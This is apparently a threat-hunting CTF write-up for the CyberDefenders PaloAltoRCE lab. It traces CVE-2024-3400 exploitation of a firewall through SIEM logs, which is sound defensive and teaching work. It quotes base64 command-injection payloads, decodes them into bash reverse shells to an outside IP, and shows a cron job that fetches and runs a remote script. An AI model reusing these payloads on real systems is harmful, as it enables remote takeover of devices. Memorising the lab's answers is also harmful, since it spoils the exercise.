https://cyberdefenders.org/blueteam-ctf-challenges/paloaltorce/

This is a threat hunting lab created by Cyber Defenders called PaloAltoRCE that uses the Elastic SIEM. It has a difficulty of Hard.

Scenario:
>Palo Alto, a leading firewall vendor, has recently announced a critical vulnerability (CVE-2024-3400) that affects specific versions of its next-generation firewalls. This critical vulnerability enables remote attackers to gain unauthorized access and potentially take full control of affected systems. These firewalls are integral to your organization's network security, as they manage and monitor both inbound and outbound traffic, safeguarding against unauthorized access and various threats.
As a security analyst, your primary task is to accurately and swiftly determine whether any of the organization's systems are impacted by this newly disclosed vulnerability.

**Q1: Identify the IP address of the first threat actor who gained unauthorized access to the environment.**

I reviewed the vendor's advisory at
https://security.paloaltonetworks.com/CVE-2024-3400, which notes in the FAQ  that the following string can indicate evidence of attempted exploit activity: "failed to unmarshal session"

I used this as a query to start the investigation, and received 118 results. Taking a quick look at them, I see that there's a host.name field and check the list of values. There's only one: "ip-172-31-28-17". After adding this field as a column, I scanned the results, primarily to see the time range of the attack (Apr 26, 2024 @ 17:58:42.867 to 17:59:12.158). I also notice that there are 17 rows missing values in the host.name column. Upon review, I find these in error.message (not an exhaustive list from all rows):

>Provided Grok expressions do not match field value: [2024-04-26 05:19:56 {"level":"error","task":"301-22","time":"2024-04-26T05:19:56.951910054-07:00","message":"==failed== ==to== ==unmarshal== ==session==(/../../../../opt/panlogs/tmp/device_telemetry/minute/abc`echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC81NC4xNjIuMTY0LjIyLzEzMzcgMD4mMQ==|base64${IFS}-d|bash`) map , EOF"}] grok

After decoding the base64 string, the result is:

```
bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
```

>Provided Grok expressions do not match field value: [2024-04-26 05:17:21 {"level":"error","task":"300-22","time":"2024-04-26T05:17:21.392894711-07:00","message":"==failed== ==to== ==unmarshal== ==session==(/../../../../opt/panlogs/tmp/device_telemetry/minute/aaa`echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8nNTQuMTYyLjE2NC4yMi8xMzMzNyAwPiYx|base64${IFS}-d|bash`) map , EOF"}] grok

```
bash -i >& /dev/tcp/54.162.164.22/13337 0>&1
```

>Provided Grok expressions do not match field value: [2024-04-26 05:01:23 {"level":"error","task":"296-22","time":"2024-04-26T05:01:23.890861508-07:00","message":"==failed== ==to== ==unmarshal== ==session==(/../../../../opt/panlogs/tmp/device_telemetry/minute/aaa`echo${IFS}d2hvYW1pID4mIC9kZXYvdGNwLzU0LjE2Mi4xNjQuMjIvMTMzMzcgMD4mMQ==|base64${IFS}-d|bash`) map , EOF"}] grok

```
whoami >& /dev/tcp/54.162.164.22/13337 0>&1
```

>Provided Grok expressions do not match field value: [2024-04-26 05:12:45 {"level":"error","task":"298-22","time":"2024-04-26T05:12:45.710458616-07:00","message":"==failed== ==to== ==unmarshal== ==session==(/../../../../opt/panlogs/tmp/device_telemetry/minute/zzz`echo${IFS}d2hvYW1pID4mIC9kZXYvdGNwLzU0LjE2Mi4xNjQuMjIvMTMzMzcgMD4mMQ==|base64${IFS}-d|bash`) map , EOF"}] grok

```
whoami >& /dev/tcp/54.162.164.22/13337 0>&1
```

>Provided Grok expressions do not match field value: [2024-04-26 05:04:25 {"level":"error","task":"297-22","time":"2024-04-26T05:04:25.485975248-07:00","message":"==failed== ==to== ==unmarshal== ==session==(/../../../../opt/panlogs/tmp/device_telemetry/minute/aaa`echo${IFS}bHMgPiYgL2Rldi90Y3AvNTQuMTYyLjE2NC4yMi8xMzMzNyAwPiYx|base64${IFS}-d|bash`) map , EOF"}] grok

```
ls >& /dev/tcp/54.162.164.22/13337 0>&1
```

I also reviewed the vendor's threat brief: https://unit42.paloaltonetworks.com/cve-2024-3400

**Q2: Determine the date and time of the initial interaction between the threat actor and the target system. Format: 24h-UTC**

I searched for the IP address seen above, and sorted the timestamp column by Old to New. This is the first result:

| Field          | Value                                                                             |
| -------------- | --------------------------------------------------------------------------------- |
| _id            | s4ybG48BvPtxZFjwM-s8                                                              |
| _index         | paloalto-nginx-access-2024.04.21                                                  |
| _score         | -                                                                                 |
| @timestamp     | Apr 21, 2024 @ 18:17:07.000                                                       |
| @version       | 1                                                                                 |
| client_ip      | 54.162.164.22                                                                     |
| event.original | ::ffff:54.162.164.22 - - [21/Apr/2024:11:17:07 -0700] "GET /" 302 0 "curl/7.81.0" |
| host.name      | ip-172-31-28-17                                                                   |
| log.file.path  | /mnt/palo_alto2/var/log/nginx/access.log                                          |
| message        | ::ffff:54.162.164.22 - - [21/Apr/2024:11:17:07 -0700] "GET /" 302 0 "curl/7.81.0" |
| method         | GET                                                                               |
| request        | /                                                                                 |
| response_code  | 302                                                                               |
| response_size  | 0                                                                                 |
| timestamp      | 21/Apr/2024:11:17:07 -0700                                                        |
| user_agent     | curl/7.81.0                                                                       |

**Q3: What is the command the threat actor used to achieve persistence on the machine?**

Reviewing the results of the query above further, I found this outreach from the host to the server for additional commands:

```
| Field           | Value                                                                                      |
|-----------------|--------------------------------------------------------------------------------------------|
| _id             | KI-eG48BvPtxZFjwqDZF                                                                       |
| _index          | paloalto-syslog-2024.04.26                                                                 |
| _score          | -                                                                                          |
| @timestamp      | Apr 26, 2024 @ 07:08:01.000                                                                |
| @version        | 1                                                                                          |
| event.original  | Apr 26 07:08:01 PA-VM crond[23980]: (root) CMD (wget -qO- http://54.162.164.22/update | bash) |
| host.name       | ip-172-31-28-17                                                                            |
| log.file.path   | /mnt/palo_alto3/var/log/syslog-system.log                                                  |
| message         | Apr 26 07:08:01 PA-VM crond[23980]: (root) CMD (wget -qO- http://54.162.164.22/update | bash), (root) CMD (wget -qO- http://54.162.164.22/update | bash) |
| pid             | 23980                                                                                      |
| program         | crond                                                                                      |
```

**Q4: What port was the first port used by one of the threat actors for the reverse shell?**

Reviewing the notes I wrote for Q1, the answer becomes clear.

**Q5: What was the name of the file one of the threat actors tried to exfiltrate?**

Having read the vendor's threat brief, I was aware that the attacker attempts to exfiltrate config files, namely "running-config.xml". 

**Q6: What was the full URL the Threat actor used to access the exfiltrated content successfully?**

The simplest solution is to review incoming HTTP GET requests from the attacker:

```
client_ip:54.162.164.22 and message:"GET "
```

A few rows down, I encountered this `message` field:

```
54.162.164.22 56222 - 172.31.38.49 20077 [26/Apr/2024:04:28:59 -0700] "==GET== /global-protect/portal/css/bootstrap.min.css HTTP/1.1" 200 155758 "https://44.217.16.42/global-protect/login.esp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0" 1714130939.038 0.002 - 8053
```

I leave it as an exercise to the reader how to arrive at the correct answer. The information you need is in the field.
